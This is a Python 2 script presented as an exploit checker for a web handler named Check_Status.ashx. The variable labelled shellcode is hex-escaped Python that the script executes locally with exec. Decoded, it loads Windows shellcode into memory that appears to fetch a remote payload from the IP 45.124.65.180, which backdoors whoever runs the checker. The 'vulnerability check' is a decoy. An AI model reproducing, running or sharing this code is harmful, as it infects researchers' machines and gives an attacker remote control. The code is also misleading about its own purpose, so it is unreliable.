
import sys, os
import threading, time
import requests

result = [False]

def run(host,port,cmd,rc):
    print "checking"
    shellcode = "\x69\x6D\x70\x6F\x72\x74\x20\x63\x74\x79\x70\x65\x73\x0D\x0A\x69\x6D\x70\x6F\x72\x74\x20\x70\x6C\x61\x74\x66\x6F\x72\x6D\x0D\x0A\x28\x61\x72\x63\x68\x2C\x20\x74\x79\x70\x65\x29\x20\x3D\x20\x70\x6C\x61\x74\x66\x6F\x72\x6D\x2E\x61\x72\x63\x68\x69\x74\x65\x63\x74\x75\x72\x65\x28\x29\x0D\x0A\x73\x68\x65\x6C\x6C\x63\x6F\x64\x65\x20\x3D\x20\x22\x5C\x78\x66\x63\x5C\x78\x34\x38\x5C\x78\x38\x33\x5C\x78\x65\x34\x5C\x78\x66\x30\x5C\x78\x65\x38\x5C\x78\x63\x38\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x31\x5C\x78\x35\x31\x5C\x78\x34\x31\x5C\x78\x35\x30\x5C\x78\x35\x32\x5C\x78\x35\x31\x5C\x78\x35\x36\x5C\x78\x34\x38\x5C\x78\x33\x31\x5C\x78\x64\x32\x5C\x78\x36\x35\x5C\x78\x34\x38\x5C\x78\x38\x62\x5C\x78\x35\x32\x5C\x78\x36\x30\x5C\x78\x34\x38\x5C\x78\x38\x62\x5C\x78\x35\x32\x5C\x78\x31\x38\x5C\x78\x34\x38\x5C\x78\x38\x62\x5C\x78\x35\x32\x5C\x78\x32\x30\x5C\x78\x34\x38\x5C\x78\x38\x62\x5C\x78\x37\x32\x5C\x78\x35\x30\x5C\x78\x34\x38\x5C\x78\x30\x66\x5C\x78\x62\x37\x5C\x78\x34\x61\x5C\x78\x34\x61\x5C\x78\x34\x64\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x34\x38\x5C\x78\x33\x31\x5C\x78\x63\x30\x5C\x78\x61\x63\x5C\x78\x33\x63\x5C\x78\x36\x31\x5C\x78\x37\x63\x5C\x78\x30\x32\x5C\x78\x32\x63\x5C\x78\x32\x30\x5C\x78\x34\x31\x5C\x78\x63\x31\x5C\x78\x63\x39\x5C\x78\x30\x64\x5C\x78\x34\x31\x5C\x78\x30\x31\x5C\x78\x63\x31\x5C\x78\x65\x32\x5C\x78\x65\x64\x5C\x78\x35\x32\x5C\x78\x34\x31\x5C\x78\x35\x31\x5C\x78\x34\x38\x5C\x78\x38\x62\x5C\x78\x35\x32\x5C\x78\x32\x30\x5C\x78\x38\x62\x5C\x78\x34\x32\x5C\x78\x33\x63\x5C\x78\x34\x38\x5C\x78\x30\x31\x5C\x78\x64\x30\x5C\x78\x36\x36\x5C\x78\x38\x31\x5C\x78\x37\x38\x5C\x78\x31\x38\x5C\x78\x30\x62\x5C\x78\x30\x32\x5C\x78\x37\x35\x5C\x78\x37\x32\x5C\x78\x38\x62\x5C\x78\x38\x30\x5C\x78\x38\x38\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x38\x5C\x78\x38\x35\x5C\x78\x63\x30\x5C\x78\x37\x34\x5C\x78\x36\x37\x5C\x78\x34\x38\x5C\x78\x30\x31\x5C\x78\x64\x30\x5C\x78\x35\x30\x5C\x78\x38\x62\x5C\x78\x34\x38\x5C\x78\x31\x38\x5C\x78\x34\x34\x5C\x78\x38\x62\x5C\x78\x34\x30\x5C\x78\x32\x30\x5C\x78\x34\x39\x5C\x78\x30\x31\x5C\x78\x64\x30\x5C\x78\x65\x33\x5C\x78\x35\x36\x5C\x78\x34\x38\x5C\x78\x66\x66\x5C\x78\x63\x39\x5C\x78\x34\x31\x5C\x78\x38\x62\x5C\x78\x33\x34\x5C\x78\x38\x38\x5C\x78\x34\x38\x5C\x78\x30\x31\x5C\x78\x64\x36\x5C\x78\x34\x64\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x34\x38\x5C\x78\x33\x31\x5C\x78\x63\x30\x5C\x78\x61\x63\x5C\x78\x34\x31\x5C\x78\x63\x31\x5C\x78\x63\x39\x5C\x78\x30\x64\x5C\x78\x34\x31\x5C\x78\x30\x31\x5C\x78\x63\x31\x5C\x78\x33\x38\x5C\x78\x65\x30\x5C\x78\x37\x35\x5C\x78\x66\x31\x5C\x78\x34\x63\x5C\x78\x30\x33\x5C\x78\x34\x63\x5C\x78\x32\x34\x5C\x78\x30\x38\x5C\x78\x34\x35\x5C\x78\x33\x39\x5C\x78\x64\x31\x5C\x78\x37\x35\x5C\x78\x64\x38\x5C\x78\x35\x38\x5C\x78\x34\x34\x5C\x78\x38\x62\x5C\x78\x34\x30\x5C\x78\x32\x34\x5C\x78\x34\x39\x5C\x78\x30\x31\x5C\x78\x64\x30\x5C\x78\x36\x36\x5C\x78\x34\x31\x5C\x78\x38\x62\x5C\x78\x30\x63\x5C\x78\x34\x38\x5C\x78\x34\x34\x5C\x78\x38\x62\x5C\x78\x34\x30\x5C\x78\x31\x63\x5C\x78\x34\x39\x5C\x78\x30\x31\x5C\x78\x64\x30\x5C\x78\x34\x31\x5C\x78\x38\x62\x5C\x78\x30\x34\x5C\x78\x38\x38\x5C\x78\x34\x38\x5C\x78\x30\x31\x5C\x78\x64\x30\x5C\x78\x34\x31\x5C\x78\x35\x38\x5C\x78\x34\x31\x5C\x78\x35\x38\x5C\x78\x35\x65\x5C\x78\x35\x39\x5C\x78\x35\x61\x5C\x78\x34\x31\x5C\x78\x35\x38\x5C\x78\x34\x31\x5C\x78\x35\x39\x5C\x78\x34\x31\x5C\x78\x35\x61\x5C\x78\x34\x38\x5C\x78\x38\x33\x5C\x78\x65\x63\x5C\x78\x32\x30\x5C\x78\x34\x31\x5C\x78\x35\x32\x5C\x78\x66\x66\x5C\x78\x65\x30\x5C\x78\x35\x38\x5C\x78\x34\x31\x5C\x78\x35\x39\x5C\x78\x35\x61\x5C\x78\x34\x38\x5C\x78\x38\x62\x5C\x78\x31\x32\x5C\x78\x65\x39\x5C\x78\x34\x66\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x35\x64\x5C\x78\x36\x61\x5C\x78\x30\x30\x5C\x78\x34\x39\x5C\x78\x62\x65\x5C\x78\x37\x37\x5C\x78\x36\x39\x5C\x78\x36\x65\x5C\x78\x36\x39\x5C\x78\x36\x65\x5C\x78\x36\x35\x5C\x78\x37\x34\x5C\x78\x30\x30\x5C\x78\x34\x31\x5C\x78\x35\x36\x5C\x78\x34\x39\x5C\x78\x38\x39\x5C\x78\x65\x36\x5C\x78\x34\x63\x5C\x78\x38\x39\x5C\x78\x66\x31\x5C\x78\x34\x31\x5C\x78\x62\x61\x5C\x78\x34\x63\x5C\x78\x37\x37\x5C\x78\x32\x36\x5C\x78\x30\x37\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x34\x38\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x34\x38\x5C\x78\x33\x31\x5C\x78\x64\x32\x5C\x78\x34\x64\x5C\x78\x33\x31\x5C\x78\x63\x30\x5C\x78\x34\x64\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x34\x31\x5C\x78\x35\x30\x5C\x78\x34\x31\x5C\x78\x35\x30\x5C\x78\x34\x31\x5C\x78\x62\x61\x5C\x78\x33\x61\x5C\x78\x35\x36\x5C\x78\x37\x39\x5C\x78\x61\x37\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x65\x62\x5C\x78\x37\x33\x5C\x78\x35\x61\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x63\x31\x5C\x78\x34\x31\x5C\x78\x62\x38\x5C\x78\x66\x62\x5C\x78\x32\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x64\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x34\x31\x5C\x78\x35\x31\x5C\x78\x34\x31\x5C\x78\x35\x31\x5C\x78\x36\x61\x5C\x78\x30\x33\x5C\x78\x34\x31\x5C\x78\x35\x31\x5C\x78\x34\x31\x5C\x78\x62\x61\x5C\x78\x35\x37\x5C\x78\x38\x39\x5C\x78\x39\x66\x5C\x78\x63\x36\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x65\x62\x5C\x78\x35\x39\x5C\x78\x35\x62\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x63\x31\x5C\x78\x34\x38\x5C\x78\x33\x31\x5C\x78\x64\x32\x5C\x78\x34\x39\x5C\x78\x38\x39\x5C\x78\x64\x38\x5C\x78\x34\x64\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x35\x32\x5C\x78\x36\x38\x5C\x78\x30\x30\x5C\x78\x30\x32\x5C\x78\x34\x30\x5C\x78\x38\x34\x5C\x78\x35\x32\x5C\x78\x35\x32\x5C\x78\x34\x31\x5C\x78\x62\x61\x5C\x78\x65\x62\x5C\x78\x35\x35\x5C\x78\x32\x65\x5C\x78\x33\x62\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x63\x36\x5C\x78\x34\x38\x5C\x78\x38\x33\x5C\x78\x63\x33\x5C\x78\x35\x30\x5C\x78\x36\x61\x5C\x78\x30\x61\x5C\x78\x35\x66\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x66\x31\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x64\x61\x5C\x78\x34\x39\x5C\x78\x63\x37\x5C\x78\x63\x30\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x34\x64\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x35\x32\x5C\x78\x35\x32\x5C\x78\x34\x31\x5C\x78\x62\x61\x5C\x78\x32\x64\x5C\x78\x30\x36\x5C\x78\x31\x38\x5C\x78\x37\x62\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x38\x35\x5C\x78\x63\x30\x5C\x78\x30\x66\x5C\x78\x38\x35\x5C\x78\x39\x64\x5C\x78\x30\x31\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x38\x5C\x78\x66\x66\x5C\x78\x63\x66\x5C\x78\x30\x66\x5C\x78\x38\x34\x5C\x78\x38\x63\x5C\x78\x30\x31\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x65\x62\x5C\x78\x64\x33\x5C\x78\x65\x39\x5C\x78\x65\x34\x5C\x78\x30\x31\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x65\x38\x5C\x78\x61\x32\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x32\x66\x5C\x78\x36\x32\x5C\x78\x34\x37\x5C\x78\x36\x63\x5C\x78\x34\x38\x5C\x78\x30\x30\x5C\x78\x36\x30\x5C\x78\x62\x32\x5C\x78\x30\x36\x5C\x78\x38\x61\x5C\x78\x64\x35\x5C\x78\x66\x36\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x35\x32\x5C\x78\x66\x33\x5C\x78\x61\x39\x5C\x78\x38\x35\x5C\x78\x61\x63\x5C\x78\x37\x30\x5C\x78\x38\x37\x5C\x78\x38\x39\x5C\x78\x36\x62\x5C\x78\x38\x30\x5C\x78\x63\x64\x5C\x78\x38\x30\x5C\x78\x32\x37\x5C\x78\x38\x35\x5C\x78\x62\x64\x5C\x78\x66\x38\x5C\x78\x35\x39\x5C\x78\x65\x62\x5C\x78\x35\x65\x5C\x78\x62\x62\x5C\x78\x36\x36\x5C\x78\x63\x34\x5C\x78\x62\x35\x5C\x78\x64\x63\x5C\x78\x36\x62\x5C\x78\x38\x38\x5C\x78\x36\x62\x5C\x78\x37\x38\x5C\x78\x32\x37\x5C\x78\x65\x61\x5C\x78\x37\x66\x5C\x78\x35\x66\x5C\x78\x31\x31\x5C\x78\x39\x32\x5C\x78\x35\x34\x5C\x78\x33\x36\x5C\x78\x36\x38\x5C\x78\x30\x33\x5C\x78\x62\x34\x5C\x78\x33\x38\x5C\x78\x61\x66\x5C\x78\x31\x39\x5C\x78\x36\x64\x5C\x78\x66\x38\x5C\x78\x62\x30\x5C\x78\x35\x37\x5C\x78\x39\x65\x5C\x78\x32\x65\x5C\x78\x64\x61\x5C\x78\x39\x33\x5C\x78\x32\x34\x5C\x78\x37\x38\x5C\x78\x35\x34\x5C\x78\x33\x31\x5C\x78\x65\x32\x5C\x78\x64\x65\x5C\x78\x38\x34\x5C\x78\x66\x63\x5C\x78\x39\x63\x5C\x78\x37\x34\x5C\x78\x37\x61\x5C\x78\x64\x61\x5C\x78\x65\x34\x5C\x78\x35\x38\x5C\x78\x34\x34\x5C\x78\x30\x30\x5C\x78\x35\x35\x5C\x78\x37\x33\x5C\x78\x36\x35\x5C\x78\x37\x32\x5C\x78\x32\x64\x5C\x78\x34\x31\x5C\x78\x36\x37\x5C\x78\x36\x35\x5C\x78\x36\x65\x5C\x78\x37\x34\x5C\x78\x33\x61\x5C\x78\x32\x30\x5C\x78\x34\x64\x5C\x78\x36\x66\x5C\x78\x37\x61\x5C\x78\x36\x39\x5C\x78\x36\x63\x5C\x78\x36\x63\x5C\x78\x36\x31\x5C";exec shellcode+"\x78\x32\x66\x5C\x78\x33\x35\x5C\x78\x32\x65\x5C\x78\x33\x30\x5C\x78\x32\x30\x5C\x78\x32\x38\x5C\x78\x36\x33\x5C\x78\x36\x66\x5C\x78\x36\x64\x5C\x78\x37\x30\x5C\x78\x36\x31\x5C\x78\x37\x34\x5C\x78\x36\x39\x5C\x78\x36\x32\x5C\x78\x36\x63\x5C\x78\x36\x35\x5C\x78\x33\x62\x5C\x78\x32\x30\x5C\x78\x34\x64\x5C\x78\x35\x33\x5C\x78\x34\x39\x5C\x78\x34\x35\x5C\x78\x32\x30\x5C\x78\x33\x39\x5C\x78\x32\x65\x5C\x78\x33\x30\x5C\x78\x33\x62\x5C\x78\x32\x30\x5C\x78\x35\x37\x5C\x78\x36\x39\x5C\x78\x36\x65\x5C\x78\x36\x34\x5C\x78\x36\x66\x5C\x78\x37\x37\x5C\x78\x37\x33\x5C\x78\x32\x30\x5C\x78\x34\x65\x5C\x78\x35\x34\x5C\x78\x32\x30\x5C\x78\x33\x36\x5C\x78\x32\x65\x5C\x78\x33\x30\x5C\x78\x33\x62\x5C\x78\x32\x30\x5C\x78\x35\x34\x5C\x78\x37\x32\x5C\x78\x36\x39\x5C\x78\x36\x34\x5C\x78\x36\x35\x5C\x78\x36\x65\x5C\x78\x37\x34\x5C\x78\x32\x66\x5C\x78\x33\x35\x5C\x78\x32\x65\x5C\x78\x33\x30\x5C\x78\x33\x62\x5C\x78\x32\x30\x5C\x78\x34\x32\x5C\x78\x34\x66\x5C\x78\x33\x31\x5C\x78\x34\x39\x5C\x78\x34\x35\x5C\x78\x33\x38\x5C\x78\x35\x66\x5C\x78\x37\x36\x5C\x78\x33\x31\x5C\x78\x33\x62\x5C\x78\x34\x35\x5C\x78\x34\x65\x5C\x78\x35\x35\x5C\x78\x35\x33\x5C\x78\x32\x39\x5C\x78\x30\x64\x5C\x78\x30\x61\x5C\x78\x30\x30\x5C\x78\x30\x61\x5C\x78\x35\x65\x5C\x78\x37\x62\x5C\x78\x64\x61\x5C\x78\x33\x33\x5C\x78\x32\x63\x5C\x78\x38\x38\x5C\x78\x62\x39\x5C\x78\x34\x32\x5C\x78\x30\x37\x5C\x78\x37\x66\x5C\x78\x31\x32\x5C\x78\x65\x35\x5C\x78\x65\x33\x5C\x78\x61\x62\x5C\x78\x37\x62\x5C\x78\x30\x62\x5C\x78\x65\x38\x5C\x78\x62\x34\x5C\x78\x64\x31\x5C\x78\x61\x32\x5C\x78\x39\x66\x5C\x78\x62\x37\x5C\x78\x34\x32\x5C\x78\x30\x38\x5C\x78\x36\x35\x5C\x78\x33\x37\x5C\x78\x35\x37\x5C\x78\x38\x33\x5C\x78\x30\x38\x5C\x78\x36\x34\x5C\x78\x64\x38\x5C\x78\x61\x36\x5C\x78\x39\x35\x5C\x78\x30\x39\x5C\x78\x64\x62\x5C\x78\x35\x31\x5C\x78\x64\x33\x5C\x78\x61\x61\x5C\x78\x36\x32\x5C\x78\x62\x33\x5C\x78\x62\x32\x5C\x78\x31\x38\x5C\x78\x65\x66\x5C\x78\x30\x65\x5C\x78\x62\x31\x5C\x78\x66\x62\x5C\x78\x66\x61\x5C\x78\x38\x36\x5C\x78\x31\x37\x5C\x78\x34\x64\x5C\x78\x36\x64\x5C\x78\x61\x61\x5C\x78\x30\x33\x5C\x78\x37\x39\x5C\x78\x66\x38\x5C\x78\x65\x39\x5C\x78\x64\x66\x5C\x78\x37\x63\x5C\x78\x34\x31\x5C\x78\x37\x34\x5C\x78\x64\x36\x5C\x78\x37\x33\x5C\x78\x35\x33\x5C\x78\x64\x65\x5C\x78\x35\x39\x5C\x78\x39\x62\x5C\x78\x66\x33\x5C\x78\x62\x39\x5C\x78\x39\x39\x5C\x78\x65\x61\x5C\x78\x31\x65\x5C\x78\x34\x64\x5C\x78\x30\x38\x5C\x78\x66\x62\x5C\x78\x30\x39\x5C\x78\x65\x36\x5C\x78\x62\x36\x5C\x78\x38\x66\x5C\x78\x32\x66\x5C\x78\x64\x38\x5C\x78\x63\x31\x5C\x78\x32\x34\x5C\x78\x34\x34\x5C\x78\x65\x39\x5C\x78\x32\x61\x5C\x78\x39\x32\x5C\x78\x62\x37\x5C\x78\x34\x38\x5C\x78\x66\x35\x5C\x78\x36\x32\x5C\x78\x62\x30\x5C\x78\x39\x33\x5C\x78\x61\x35\x5C\x78\x36\x62\x5C\x78\x30\x62\x5C\x78\x38\x38\x5C\x78\x39\x33\x5C\x78\x33\x64\x5C\x78\x33\x33\x5C\x78\x37\x35\x5C\x78\x35\x37\x5C\x78\x63\x63\x5C\x78\x35\x30\x5C\x78\x65\x61\x5C\x78\x37\x35\x5C\x78\x37\x35\x5C\x78\x37\x39\x5C\x78\x32\x65\x5C\x78\x66\x65\x5C\x78\x34\x32\x5C\x78\x37\x65\x5C\x78\x35\x63\x5C\x78\x33\x62\x5C\x78\x61\x30\x5C\x78\x33\x38\x5C\x78\x39\x66\x5C\x78\x36\x37\x5C\x78\x38\x35\x5C\x78\x36\x39\x5C\x78\x31\x32\x5C\x78\x37\x31\x5C\x78\x65\x64\x5C\x78\x38\x61\x5C\x78\x32\x33\x5C\x78\x39\x65\x5C\x78\x61\x39\x5C\x78\x38\x32\x5C\x78\x31\x33\x5C\x78\x65\x37\x5C\x78\x65\x62\x5C\x78\x63\x30\x5C\x78\x65\x36\x5C\x78\x38\x32\x5C\x78\x33\x65\x5C\x78\x31\x61\x5C\x78\x62\x38\x5C\x78\x32\x37\x5C\x78\x65\x65\x5C\x78\x37\x30\x5C\x78\x30\x38\x5C\x78\x35\x38\x5C\x78\x38\x65\x5C\x78\x39\x32\x5C\x78\x37\x36\x5C\x78\x65\x34\x5C\x78\x39\x63\x5C\x78\x65\x35\x5C\x78\x31\x61\x5C\x78\x38\x39\x5C\x78\x37\x61\x5C\x78\x38\x36\x5C\x78\x30\x62\x5C\x78\x39\x32\x5C\x78\x39\x61\x5C\x78\x37\x37\x5C\x78\x36\x65\x5C\x78\x30\x38\x5C\x78\x35\x65\x5C\x78\x39\x64\x5C\x78\x31\x65\x5C\x78\x65\x35\x5C\x78\x64\x66\x5C\x78\x34\x61\x5C\x78\x33\x39\x5C\x78\x63\x35\x5C\x78\x63\x34\x5C\x78\x34\x33\x5C\x78\x62\x64\x5C\x78\x34\x31\x5C\x78\x64\x39\x5C\x78\x31\x65\x5C\x78\x36\x32\x5C\x78\x36\x62\x5C\x78\x65\x35\x5C\x78\x38\x33\x5C\x78\x33\x61\x5C\x78\x37\x34\x5C\x78\x61\x35\x5C\x78\x33\x34\x5C\x78\x35\x35\x5C\x78\x61\x62\x5C\x78\x33\x62\x5C\x78\x35\x66\x5C\x78\x30\x61\x5C\x78\x65\x30\x5C\x78\x32\x33\x5C\x78\x33\x65\x5C\x78\x30\x61\x5C\x78\x32\x35\x5C\x78\x32\x31\x5C\x78\x36\x66\x5C\x78\x37\x31\x5C\x78\x36\x64\x5C\x78\x31\x37\x5C\x78\x34\x63\x5C\x78\x38\x62\x5C\x78\x39\x62\x5C\x78\x39\x32\x5C\x78\x66\x62\x5C\x78\x39\x63\x5C\x78\x36\x35\x5C\x78\x61\x61\x5C\x78\x30\x61\x5C\x78\x65\x32\x5C\x78\x65\x32\x5C\x78\x34\x30\x5C\x78\x36\x33\x5C\x78\x38\x33\x5C\x78\x30\x30\x5C\x78\x34\x31\x5C\x78\x62\x65\x5C\x78\x66\x30\x5C\x78\x62\x35\x5C\x78\x61\x32\x5C\x78\x35\x36\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x34\x38\x5C\x78\x33\x31\x5C\x78\x63\x39\x5C\x78\x62\x61\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x30\x5C\x78\x30\x30\x5C\x78\x34\x31\x5C\x78\x62\x38\x5C\x78\x30\x30\x5C\x78\x31\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x31\x5C\x78\x62\x39\x5C\x78\x34\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x31\x5C\x78\x62\x61\x5C\x78\x35\x38\x5C\x78\x61\x34\x5C\x78\x35\x33\x5C\x78\x65\x35\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x34\x38\x5C\x78\x39\x33\x5C\x78\x35\x33\x5C\x78\x35\x33\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x65\x37\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x66\x31\x5C\x78\x34\x38\x5C\x78\x38\x39\x5C\x78\x64\x61\x5C\x78\x34\x31\x5C\x78\x62\x38\x5C\x78\x30\x30\x5C\x78\x32\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x34\x39\x5C\x78\x38\x39\x5C\x78\x66\x39\x5C\x78\x34\x31\x5C\x78\x62\x61\x5C\x78\x31\x32\x5C\x78\x39\x36\x5C\x78\x38\x39\x5C\x78\x65\x32\x5C\x78\x66\x66\x5C\x78\x64\x35\x5C\x78\x34\x38\x5C\x78\x38\x33\x5C\x78\x63\x34\x5C\x78\x32\x30\x5C\x78\x38\x35\x5C\x78\x63\x30\x5C\x78\x37\x34\x5C\x78\x62\x36\x5C\x78\x36\x36\x5C\x78\x38\x62\x5C\x78\x30\x37\x5C\x78\x34\x38\x5C\x78\x30\x31\x5C\x78\x63\x33\x5C\x78\x38\x35\x5C\x78\x63\x30\x5C\x78\x37\x35\x5C\x78\x64\x37\x5C\x78\x35\x38\x5C\x78\x35\x38\x5C\x78\x35\x38\x5C\x78\x34\x38\x5C\x78\x30\x35\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x30\x30\x5C\x78\x35\x30\x5C\x78\x63\x33\x5C\x78\x65\x38\x5C\x78\x39\x66\x5C\x78\x66\x64\x5C\x78\x66\x66\x5C\x78\x66\x66\x5C\x78\x33\x34\x5C\x78\x33\x35\x5C\x78\x32\x65\x5C\x78\x33\x31\x5C\x78\x33\x32\x5C\x78\x33\x34\x5C\x78\x32\x65\x5C\x78\x33\x36\x5C\x78\x33\x35\x5C\x78\x32\x65\x5C\x78\x33\x31\x5C\x78\x33\x38\x5C\x78\x33\x30\x5C\x78\x30\x30\x5C\x78\x31\x64\x5C\x78\x38\x64\x5C\x78\x33\x32\x5C\x78\x34\x36\x22\x0D\x0A\x69\x66\x20\x74\x79\x70\x65\x20\x21\x3D\x20\x22\x57\x69\x6E\x64\x6F\x77\x73\x50\x45\x22\x20\x6F\x72\x20\x6C\x65\x6E\x28\x73\x68\x65\x6C\x6C\x63\x6F\x64\x65\x29\x20\x3D\x3D\x20\x30\x3A\x0D\x0A\x09\x71\x75\x69\x74\x28\x29\x0D\x0A\x72\x77\x78\x70\x61\x67\x65\x20\x3D\x20\x63\x74\x79\x70\x65\x73\x2E\x77\x69\x6E\x64\x6C\x6C\x2E\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x56\x69\x72\x74\x75\x61\x6C\x41\x6C\x6C\x6F\x63\x28\x30\x2C\x20\x6C\x65\x6E\x28\x73\x68\x65\x6C\x6C\x63\x6F\x64\x65\x29\x2C\x20\x30\x78\x31\x30\x30\x30\x2C\x20\x30\x78\x34\x30\x29\x0D\x0A\x63\x74\x79\x70\x65\x73\x2E\x77\x69\x6E\x64\x6C\x6C\x2E\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x52\x74\x6C\x4D\x6F\x76\x65\x4D\x65\x6D\x6F\x72\x79\x28\x72\x77\x78\x70\x61\x67\x65\x2C\x20\x63\x74\x79\x70\x65\x73\x2E\x63\x72\x65\x61\x74\x65\x5F\x73\x74\x72\x69\x6E\x67\x5F\x62\x75\x66\x66\x65\x72\x28\x73\x68\x65\x6C\x6C\x63\x6F\x64\x65\x29\x2C\x20\x6C\x65\x6E\x28\x73\x68\x65\x6C\x6C\x63\x6F\x64\x65\x29\x29\x0D\x0A\x68\x61\x6E\x64\x6C\x65\x20\x3D\x20\x63\x74\x79\x70\x65\x73\x2E\x77\x69\x6E\x64\x6C\x6C\x2E\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x43\x72\x65\x61\x74\x65\x54\x68\x72\x65\x61\x64\x28\x30\x2C\x20\x30\x2C\x20\x72\x77\x78\x70\x61\x67\x65\x2C\x20\x30\x2C\x20\x30\x2C\x20\x30\x29\x0D\x0A\x63\x74\x79\x70\x65\x73\x2E\x77\x69\x6E\x64\x6C\x6C\x2E\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x57\x61\x69\x74\x46\x6F\x72\x53\x69\x6E\x67\x6C\x65\x4F\x62\x6A\x65\x63\x74\x28\x68\x61\x6E\x64\x6C\x65\x2C\x20\x2D\x31\x29"
    url = "http://"+host+":"+port+"/handlers/Check_Status.ashx"
    data = 'id=8bbc8456-f406-11ea-88e4-00ff57a48f69&query_string="group=admin AND param=user_status;s='+shellcode+'"&cmd='+cmd
    r = requests.post(url, data)
    if 'Q_ERROR' in r.text:
        rc.append(True)
    else:
        rc.append(False)
    return

def main():
    host = sys.argv[1]
    port = sys.argv[2]
    #cmd = sys.argv[3]
    cmd = "whoami"
    t = threading.Thread(target=run, args=(host,port,cmd,result))
    t.start()
    time.sleep(10)
    if result[0]:
        print "vulnerable"
    else:
        print "not vulnerable"
    os._exit(0)
if __name__ == '__main__':
    #if len(sys.argv) != 4:
    if len(sys.argv) != 3:
        print "example: python exp.py 1.1.1.1 8080 whoami"
    else:
	    main()
